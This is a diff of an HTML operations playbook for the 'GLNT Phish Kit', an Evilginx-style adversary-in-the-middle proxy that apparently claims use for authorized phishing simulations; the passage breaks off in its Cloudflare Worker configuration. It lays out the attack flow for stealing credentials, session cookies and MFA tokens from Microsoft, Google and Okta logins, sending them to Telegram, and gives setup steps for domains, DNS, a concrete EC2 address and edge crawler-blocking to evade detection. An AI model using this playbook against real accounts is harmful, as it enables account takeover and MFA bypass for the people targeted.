@@ -1,1079 +1,926 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="generator" content="pandoc" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-  <title>GLNT Phish Kit — Operations Playbook v1.1</title>
-  <style>
-    /* Default styles provided by pandoc.
-    ** See https://pandoc.org/MANUAL.html#variables-for-html for config info.
-    */
-    html {
-      color: #1a1a1a;
-      background-color: #fdfdfd;
-    }
-    body {
-      margin: 0 auto;
-      max-width: 36em;
-      padding-left: 50px;
-      padding-right: 50px;
-      padding-top: 50px;
-      padding-bottom: 50px;
-      hyphens: auto;
-      overflow-wrap: break-word;
-      text-rendering: optimizeLegibility;
-      font-kerning: normal;
-    }
-    @media (max-width: 600px) {
-      body {
-        font-size: 0.9em;
-        padding: 12px;
-      }
-      h1 {
-        font-size: 1.8em;
-      }
-    }
-    @media print {
-      html {
-        background-color: white;
-      }
-      body {
-        background-color: transparent;
-        color: black;
-        font-size: 12pt;
-      }
-      p, h2, h3 {
-        orphans: 3;
-        widows: 3;
-      }
-      h2, h3, h4 {
-        page-break-after: avoid;
-      }
-    }
-    p {
-      margin: 1em 0;
-    }
-    a {
-      color: #1a1a1a;
-    }
-    a:visited {
-      color: #1a1a1a;
-    }
-    img {
-      max-width: 100%;
-    }
-    svg {
-      height: auto;
-      max-width: 100%;
-    }
-    h1, h2, h3, h4, h5, h6 {
-      margin-top: 1.4em;
-    }
-    h5, h6 {
-      font-size: 1em;
-      font-style: italic;
-    }
-    h6 {
-      font-weight: normal;
-    }
-    ol, ul {
-      padding-left: 1.7em;
-      margin-top: 1em;
-    }
-    li > ol, li > ul {
-      margin-top: 0;
-    }
-    blockquote {
-      margin: 1em 0 1em 1.7em;
-      padding-left: 1em;
-      border-left: 2px solid #e6e6e6;
-      color: #606060;
-    }
-    code {
-      white-space: pre-wrap;
-      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
-      font-size: 85%;
-      margin: 0;
-      hyphens: manual;
-    }
-    pre {
-      margin: 1em 0;
-      overflow: auto;
-    }
-    pre code {
-      padding: 0;
-      overflow: visible;
-      overflow-wrap: normal;
-    }
-    .sourceCode {
-     background-color: transparent;
-     overflow: visible;
-    }
-    hr {
-      border: none;
-      border-top: 1px solid #1a1a1a;
-      height: 1px;
-      margin: 1em 0;
-    }
-    table {
-      margin: 1em 0;
-      border-collapse: collapse;
-      width: 100%;
-      overflow-x: auto;
-      display: block;
-      font-variant-numeric: lining-nums tabular-nums;
-    }
-    table caption {
-      margin-bottom: 0.75em;
-    }
-    tbody {
-      margin-top: 0.5em;
-      border-top: 1px solid #1a1a1a;
-      border-bottom: 1px solid #1a1a1a;
-    }
-    th {
-      border-top: 1px solid #1a1a1a;
-      padding: 0.25em 0.5em 0.25em 0.5em;
-    }
-    td {
-      padding: 0.125em 0.5em 0.25em 0.5em;
-    }
-    header {
-      margin-bottom: 4em;
-      text-align: center;
-    }
-    #TOC li {
-      list-style: none;
-    }
-    #TOC ul {
-      padding-left: 1.3em;
-    }
-    #TOC > ul {
-      padding-left: 0;
-    }
-    #TOC a:not(:hover) {
-      text-decoration: none;
-    }
-    span.smallcaps{font-variant: small-caps;}
-    div.columns{display: flex; gap: min(4vw, 1.5em);}
-    div.column{flex: auto; overflow-x: auto;}
-    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
-    /* The extra [class] is a hack that increases specificity enough to
-       override a similar rule in reveal.js */
-    ul.task-list[class]{list-style: none;}
-    ul.task-list li input[type="checkbox"] {
-      font-size: inherit;
-      width: 0.8em;
-      margin: 0 0.8em 0.2em -1.6em;
-      vertical-align: middle;
-    }
-    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
-    /* CSS for syntax highlighting */
-    html { -webkit-text-size-adjust: 100%; }
-    pre > code.sourceCode { white-space: pre; position: relative; }
-    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
-    pre > code.sourceCode > span:empty { height: 1.2em; }
-    .sourceCode { overflow: visible; }
-    code.sourceCode > span { color: inherit; text-decoration: inherit; }
-    div.sourceCode { margin: 1em 0; }
-    pre.sourceCode { margin: 0; }
-    @media screen {
-    div.sourceCode { overflow: auto; }
-    }
-    @media print {
-    pre > code.sourceCode { white-space: pre-wrap; }
-    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
-    }
-    pre.numberSource code
-      { counter-reset: source-line 0; }
-    pre.numberSource code > span
-      { position: relative; left: -4em; counter-increment: source-line; }
-    pre.numberSource code > span > a:first-child::before
-      { content: counter(source-line);
-        position: relative; left: -1em; text-align: right; vertical-align: baseline;
-        border: none; display: inline-block;
-        -webkit-touch-callout: none; -webkit-user-select: none;
-        -khtml-user-select: none; -moz-user-select: none;
-        -ms-user-select: none; user-select: none;
-        padding: 0 4px; width: 4em;
-        color: #aaaaaa;
-      }
-    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
-    div.sourceCode
-      {   }
-    @media screen {
-    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
-    }
-    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
-    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
-    code span.at { color: #7d9029; } /* Attribute */
-    code span.bn { color: #40a070; } /* BaseN */
-    code span.bu { color: #008000; } /* BuiltIn */
-    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
-    code span.ch { color: #4070a0; } /* Char */
-    code span.cn { color: #880000; } /* Constant */
-    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
-    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
-    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
-    code span.dt { color: #902000; } /* DataType */
-    code span.dv { color: #40a070; } /* DecVal */
-    code span.er { color: #ff0000; font-weight: bold; } /* Error */
-    code span.ex { } /* Extension */
-    code span.fl { color: #40a070; } /* Float */
-    code span.fu { color: #06287e; } /* Function */
-    code span.im { color: #008000; font-weight: bold; } /* Import */
-    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
-    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
-    code span.op { color: #666666; } /* Operator */
-    code span.ot { color: #007020; } /* Other */
-    code span.pp { color: #bc7a00; } /* Preprocessor */
-    code span.sc { color: #4070a0; } /* SpecialChar */
-    code span.ss { color: #bb6688; } /* SpecialString */
-    code span.st { color: #4070a0; } /* String */
-    code span.va { color: #19177c; } /* Variable */
-    code span.vs { color: #4070a0; } /* VerbatimString */
-    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FM-001 — GLNT Phish Kit Operations Playbook</title>
+<style>
+  :root {
+    --paper: #f7f5f0;
+    --ink: #1a1814;
+    --ink-dim: #5c5852;
+    --ink-faint: #8a8680;
+    --accent: #c41e3a;
+    --accent-dim: #8b1528;
+    --rule: #d4d0c8;
+    --surface: #ede9e2;
+    --code-bg: #e8e4dc;
+    --note-bg: #fef3e8;
+    --note-border: #f0c070;
+    --warn-bg: #fde8e8;
+    --warn-border: #e07070;
+  }
+  @font-face {
+    font-family: 'JetBrains Mono';
+    src: local('JetBrains Mono'), local('Menlo'), local('Consolas'), local('monospace');
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: "Iowan Old Style", "Palatino Linotype", Palatino, Georgia, serif;
+    font-size: 17px;
+    line-height: 1.7;
+    color: var(--ink);
+    background: var(--paper);
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  .cover {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding: 80px 0;
+    position: relative;
+    border-bottom: 1px solid var(--rule);
+  }
+  .cover::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 4px;
+    background: var(--accent);
+  }
+  .cover .classification {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.65rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    color: var(--accent);
+    margin-bottom: 52px;
+    text-align: center;
+  }
+  .cover .fm-number {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.75rem;
+    font-weight: 400;
+    color: var(--ink-dim);
+    letter-spacing: 0.12em;
+    margin-bottom: 12px;
+    text-align: center;
+  }
+  .cover h1 {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 2.2rem;
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    text-align: center;
+    line-height: 1.2;
+    margin-bottom: 8px;
+    color: var(--ink);
+  }
+  .cover .subtitle {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.85rem;
+    color: var(--ink-dim);
+    text-align: center;
+    letter-spacing: 0.06em;
+    margin-bottom: 48px;
+  }
+  .cover .meta {
+    text-align: center;
+    font-size: 0.75rem;
+    color: var(--ink-faint);
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    line-height: 1.8;
+  }
+  .cover .rule {
+    width: 60px;
+    height: 1px;
+    background: var(--rule);
+    margin: 32px auto;
+  }
+
+  .content {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 0 32px 80px;
+  }
+  .content > * {
+    margin-bottom: 28px;
+  }
+
+  h2 {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 1.05rem;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+    color: var(--ink);
+    margin-top: 56px;
+    margin-bottom: 10px;
+    padding-top: 20px;
+    border-top: 1px solid var(--rule);
+    position: relative;
+  }
+  h2::before {
+    content: '\00A7';
+    position: absolute;
+    left: -28px;
+    top: 18px;
+    font-size: 0.85rem;
+    color: var(--accent);
+    font-weight: 400;
+  }
+  h3 {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--ink);
+    margin-top: 32px;
+    margin-bottom: 6px;
+    letter-spacing: 0.02em;
+  }
+
+  p {
+    margin-bottom: 16px;
+    color: var(--ink);
+    text-align: justify;
+    hyphens: auto;
+  }
+
+  a {
+    color: var(--accent-dim);
+  }
+
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--rule);
+    border-radius: 2px;
+    padding: 20px 24px;
+    overflow-x: auto;
+    margin: 20px 0;
+    font-size: 0.78rem;
+    line-height: 1.55;
+  }
+  pre code {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.78rem;
+    color: var(--ink);
+  }
+  code {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.85em;
+    background: var(--code-bg);
+    padding: 1px 5px;
+    border-radius: 2px;
+  }
+
+  .note {
+    background: var(--note-bg);
+    border-left: 3px solid var(--note-border);
+    padding: 14px 18px;
+    margin: 24px 0;
+    font-size: 0.9rem;
+    color: #5c3a10;
+    border-radius: 0 3px 3px 0;
+  }
+  .note strong { color: #8a4a00; }
+  .warn {
+    background: var(--warn-bg);
+    border-left: 3px solid var(--warn-border);
+    padding: 14px 18px;
+    margin: 24px 0;
+    font-size: 0.9rem;
+    color: #5c1010;
+    border-radius: 0 3px 3px 0;
+  }
+  .warn strong { color: #8a0000; }
+
+  ul, ol {
+    padding-left: 1.7em;
+    margin-bottom: 16px;
+  }
+  li {
+    margin-bottom: 6px;
+    color: var(--ink);
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+    font-size: 0.85rem;
+  }
+  th {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.68rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--ink-dim);
+    text-align: left;
+    padding: 10px 14px 6px;
+    border-bottom: 2px solid var(--rule);
+  }
+  td {
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--rule);
+    color: var(--ink);
+  }
+  tr:last-child td { border-bottom: none; }
+
+  kbd {
+    display: inline-block;
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.72rem;
+    font-weight: 600;
+    padding: 2px 8px;
+    border: 1.5px solid #b0aaa0;
+    border-radius: 3px;
+    background: #f0ece4;
+    color: var(--ink);
+    box-shadow: 0 1px 0 #b0aaa0;
+    margin: 0 2px;
+  }
+
+  .footer {
+    margin-top: 64px;
+    padding-top: 16px;
+    border-top: 1px solid var(--rule);
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.65rem;
+    color: var(--ink-faint);
+    letter-spacing: 0.04em;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .margin-note {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.65rem;
+    color: var(--ink-faint);
+    letter-spacing: 0.04em;
+    float: right;
+    clear: right;
+    width: 160px;
+    margin-right: -180px;
+    margin-top: 4px;
+    line-height: 1.4;
+    text-align: left;
+    hyphens: none;
+  }
+  @media (max-width: 1100px) {
+    .margin-note { display: none; }
+  }
+
+  .step {
+    counter-increment: step-counter;
+    padding-left: 12px;
+    border-left: 3px solid var(--rule);
+    margin: 16px 0 16px 8px;
+    transition: border-color 0.2s;
+  }
+  .step:hover { border-left-color: var(--accent); }
+  .step::before {
+    content: counter(step-counter);
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--accent);
+    display: block;
+    margin-bottom: 2px;
+  }
+
+  .checklist {
+    counter-reset: step-counter;
+    list-style: none;
+    padding-left: 0;
+  }
+
+  @media print {
+    body { font-size: 12px; }
+    .content { max-width: 100%; padding: 0 40px; }
+    .margin-note { display: none; }
+    pre, code { font-size: 10px; }
+    h2 { page-break-before: always; }
+    h2:first-of-type { page-break-before: avoid; }
+    .cover { page-break-after: always; }
+  }
+</style>
 </head>
 <body>
-<header id="title-block-header">
-<h1 class="title">GLNT Phish Kit — Operations Playbook v1.1</h1>
-</header>
-<h1 id="glnt-phish-kit-operations-playbook">GLNT Phish Kit — Operations
-Playbook</h1>
-<p><strong>Version:</strong> 1.1 | <strong>Classification:</strong>
-Internal | <strong>Last Updated:</strong> 2026-06-20</p>
-<hr />
-<h2 id="what-this-kit-does">1. What This Kit Does</h2>
-<p>An Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy for
-authorized phishing simulations. The victim sees the
-<strong>real</strong> Microsoft/Google/Okta login page proxied through
-your server. Credentials, session cookies, and MFA tokens are captured
-and delivered to Telegram.</p>
-<h3 id="attack-flow-10-seconds">Attack Flow (10 seconds)</h3>
-<pre><code>Victim clicks link → glnt.cc (bootloader, 100ms decrypt)
-  → Real Microsoft login page appears (proxied through your domain)
-  → Victim enters credentials + completes MFA
-  → Telegram notification with:
+
+<div class="cover">
+  <div class="classification">INTERNAL</div>
+  <div class="fm-number">FM-001</div>
+  <h1>GLNT Phish Kit</h1>
+  <div class="subtitle">Operations Playbook</div>
+  <div class="rule"></div>
+  <div class="meta">
+    STRASSER &#x271B; LAB<br>
+    Version 1.1 &middot; June 2026<br>
+    Classification: Internal
+  </div>
+</div>
+
+<div class="content">
+
+<h2>What This Kit Does</h2>
+
+<p>An Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy for authorized phishing simulations. The victim sees the <strong>real</strong> Microsoft/Google/Okta login page proxied through your server. Credentials, session cookies, and MFA tokens are captured and delivered to Telegram.</p>
+
+<h3>Attack Flow (10 seconds)</h3>
+
+<pre><code>Victim clicks link &rarr; glnt.cc (bootloader, 100ms decrypt)
+  &rarr; Real Microsoft login page appears (proxied through your domain)
+  &rarr; Victim enters credentials + completes MFA
+  &rarr; Telegram notification with:
        - Username + password
        - Session cookies (.txt attachment)
        - IP, User-Agent, timestamp
        - Ready-to-use cookie replay script</code></pre>
-<h3 id="why-this-works-against-mfa">Why This Works Against MFA</h3>
-<p>The victim completes the ENTIRE authentication flow through your
-proxy — username, password, MFA challenge, and the final session token
-redirect. Every HTTP request the browser makes goes through your server.
-The session cookies Microsoft issues after successful MFA are captured
-and can be replayed to access the victim’s account without triggering
-MFA again.</p>
-<hr />
-<h2 id="architecture">2. Architecture</h2>
-<pre><code>┌─────────────────────────────────────────────────────────────┐
-│ LAYER 1: LURE GENERATION                                     │
-│ payload-generator/                                           │
-│ AES-256-GCM encrypted URL fragment with random prefix        │
-│ Each victim gets a unique URL — no static signatures          │
-└─────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ LAYER 2: CLOUDFLARE CDN                                     │
-│ cdn-config/worker.js                                         │
-│ Cloudflare Worker terminates TLS, hides origin IP             │
-│ Bot/crawler blocking at edge — Googlebot gets 404             │
-│ Server header overridden to &quot;cloudflare&quot;                      │
-└─────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ LAYER 3: AiTM PROXY (EC2)                                    │
-│ proxy-server/ (Go binary, port 9091)                         │
-│                                                              │
-│ Bootloader → decrypts fragment, sets tracking cookies         │
-│ Reverse proxy → routes ALL requests to real login             │
-│ Body rewriting → login.microsoftonline.com → login.glnt.cc   │
-│ Response rewriting → strips CSP, XFO, cookie domain/secure    │
-│ Credential extraction → username + password from POST body    │
-│ Session capture → ESTSAUTH, ESTSAUTHPERSISTENT, etc.         │
-│ Rate limiting → 10 req/min per IP                             │
-└─────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ LAYER 4: EXFILTRATION                                        │
-│ Telegram bot → real-time notification + session .txt          │
-│ JSONL file → campaign analytics                               │
-│ Analytics dashboard → web UI on port 9092 (token auth)        │
-└─────────────────────────────────────────────────────────────┘</code></pre>
-<hr />
-<h2 id="infrastructure-setup">3. Infrastructure Setup</h2>
-<h3 id="domain-registration-cloudflare">Domain Registration
-(Cloudflare)</h3>
-<ol type="1">
-<li>Go to <a href="https://dash.cloudflare.com">dash.cloudflare.com</a>
-→ Register Domain</li>
-<li>Pick a short, abstract domain (no brand words — “login”, “verify”,
-“office”, “auth”)</li>
-<li>Recommended pattern: 4-5 chars on .cc or .xyz</li>
-<li>Example: <code>glnt.cc</code></li>
-</ol>
-<h3 id="cloudflare-dns">Cloudflare DNS</h3>
-<pre><code>Type    Name    Content              Proxy
-A       @       192.0.2.1            ON (orange cloud)
-A       *       13.218.149.33        ON (orange cloud)</code></pre>
-<ul>
-<li>The apex <code>@</code> record can point to any IP — the Worker
-intercepts all traffic</li>
-<li>The wildcard <code>*</code> record points to your EC2 for subdomain
-phishlets</li>
-<li>Orange cloud ON for both — hides origin IP</li>
-</ul>
-<h3 id="cloudflare-worker">Cloudflare Worker</h3>
+
+<h3>Why This Works Against MFA</h3>
+
+<p>The victim completes the ENTIRE authentication flow through your proxy &mdash; username, password, MFA challenge, and the final session token redirect. Every HTTP request the browser makes goes through your server. The session cookies Microsoft issues after successful MFA are captured and can be replayed to access the victim's account without triggering MFA again.</p>
+
+<h2>Architecture</h2>
+
+<pre><code>&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;
+&#x2502; LAYER 1: LURE GENERATION                                     &#x2502;
+&#x2502; payload-generator/                                           &#x2502;
+&#x2502; AES-256-GCM encrypted URL fragment with random prefix        &#x2502;
+&#x2502; Each victim gets a unique URL &mdash; no static signatures          &#x2502;
+&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;
+                              &#x2502;
+                              &#x25BC;
+&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;
+&#x2502; LAYER 2: CLOUDFLARE CDN                                     &#x2502;
+&#x2502; cdn-config/worker.js                                         &#x2502;
+&#x2502; Cloudflare Worker terminates TLS, hides origin IP             &#x2502;
+&#x2502; Bot/crawler blocking at edge &mdash; Googlebot gets 404             &#x2502;
+&#x2502; Server header overridden to "cloudflare"                      &#x2502;
+&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;
+                              &#x2502;
+                              &#x25BC;
+&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;
+&#x2502; LAYER 3: AiTM PROXY (EC2)                                    &#x2502;
+&#x2502; proxy-server/ (Go binary, port 9091)                         &#x2502;
+&#x2502;                                                              &#x2502;
+&#x2502; Bootloader &rarr; decrypts fragment, sets tracking cookies         &#x2502;
+&#x2502; Reverse proxy &rarr; routes ALL requests to real login             &#x2502;
+&#x2502; Body rewriting &rarr; login.microsoftonline.com &rarr; login.glnt.cc   &#x2502;
+&#x2502; Response rewriting &rarr; strips CSP, XFO, cookie domain/secure    &#x2502;
+&#x2502; Credential extraction &rarr; username + password from POST body    &#x2502;
+&#x2502; Session capture &rarr; ESTSAUTH, ESTSAUTHPERSISTENT, etc.         &#x2502;
+&#x2502; Rate limiting &rarr; 10 req/min per IP                             &#x2502;
+&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;
+                              &#x2502;
+                              &#x25BC;
+&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;
+&#x2502; LAYER 4: EXFILTRATION                                        &#x2502;
+&#x2502; Telegram bot &rarr; real-time notification + session .txt          &#x2502;
+&#x2502; JSONL file &rarr; campaign analytics                               &#x2502;
+&#x2502; Analytics dashboard &rarr; web UI on port 9092 (token auth)        &#x2502;
+&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre>
+
+<h2>Infrastructure Setup</h2>
+
+<h3>Domain Registration (Cloudflare)</h3>
+
+<div class="step"><p>Go to <a href="https://dash.cloudflare.com">dash.cloudflare.com</a> &rarr; Register Domain</p></div>
+<div class="step"><p>Pick a short, abstract domain (no brand words &mdash; "login", "verify", "office", "auth")</p></div>
+<div class="step"><p>Recommended pattern: 4-5 chars on .cc or .xyz</p></div>
+<div class="step"><p>Example: <code>glnt.cc</code></p></div>
+
+<h3>Cloudflare DNS</h3>
+
+<table>
+  <thead><tr><th>Type</th><th>Name</th><th>Content</th><th>Proxy</th></tr></thead>
+  <tbody>
+    <tr><td>A</td><td>@</td><td>192.0.2.1</td><td>ON (orange cloud)</td></tr>
+    <tr><td>A</td><td>*</td><td>13.218.149.33</td><td>ON (orange cloud)</td></tr>
+  </tbody>
+</table>
+
+<p>The apex <code>@</code> record can point to any IP &mdash; the Worker intercepts all traffic. The wildcard <code>*</code> record points to your EC2 for subdomain phishlets. Orange cloud ON for both &mdash; hides origin IP.</p>
+
+<h3>Cloudflare Worker</h3>
+
 <p><strong>File:</strong> <code>cdn-config/worker.js</code></p>
+
 <p>Deployed via wrangler:</p>
-<div class="sourceCode" id="cb4"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> cdn-config</span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">npx</span> wrangler login                          <span class="co"># one-time</span></span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">npx</span> wrangler deploy</span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">npx</span> wrangler secret put ORIGIN_URL         <span class="co"># paste: http://&lt;EC2-IP&gt;:9091</span></span></code></pre></div>
+
+<pre><code>cd cdn-config
+npx wrangler login                          # one-time
+npx wrangler deploy
+npx wrangler secret put ORIGIN_URL         # paste: http://&lt;EC2-IP&gt;:9091</code></pre>
+
 <p><strong>File:</strong> <code>cdn-config/wrangler.toml</code></p>
-<div class="sourceCode" id="cb5"><pre
-class="sourceCode toml"><code class="sourceCode toml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">name</span> <span class="op">=</span> <span class="st">&quot;glnt-proxy&quot;</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="dt">main</span> <span class="op">=</span> <span class="st">&quot;worker.js&quot;</span></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="dt">compatibility_date</span> <span class="op">=</span> <span class="st">&quot;2024-01-01&quot;</span></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="kw">[[routes]]</span></span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="dt">pattern</span> <span class="op">=</span> <span class="st">&quot;&lt;domain&gt;/*&quot;</span></span>
